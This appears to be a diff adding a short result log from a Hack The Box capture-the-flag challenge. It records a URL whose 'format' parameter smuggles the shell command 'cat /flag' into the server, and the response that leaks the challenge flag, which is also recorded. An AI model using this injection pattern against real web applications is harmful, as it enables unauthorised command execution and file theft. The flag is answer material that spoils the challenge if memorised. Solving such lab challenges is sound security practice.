@@ -1,0 +1,6 @@
+﻿URI=http://154.57.164.82:30695/?format='%20%3B%20cat%20%2Fflag%20%3B%20'
+STATUS=200
+LEN=2000
+H1=<h1 class="jumbotron-heading">><span class='text-muted'>It's</span> HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_489135c96ccbd58dbb8f42b8806e5911}sh: 1: : Permission denied<span class='text-muted'>.</span></h1>
+FLAG=HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_489135c96ccbd58dbb8f42b8806e5911}
+
